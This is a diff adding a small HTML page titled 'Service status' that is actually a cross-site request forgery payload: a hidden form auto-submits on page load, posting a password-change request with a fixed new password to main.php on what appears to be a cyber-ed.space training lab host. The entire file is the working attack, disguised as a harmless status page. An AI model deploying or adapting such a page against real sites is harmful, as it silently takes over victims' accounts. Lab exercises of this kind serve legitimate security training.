@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Service status</title>
+</head>
+<body>
+    <form
+        id="csrf"
+        action="http://web.vp159xv7rquo97b3v1nb.labs.cyber-ed.space/main.php"
+        method="POST"
+    >
+        <input type="hidden" name="action" value="change_password">
+        <input type="hidden" name="new_password" value="CyberED2026test">
+    </form>
+
+    <script>
+        document.getElementById("csrf").submit();
+    </script>
+</body>
+</html>
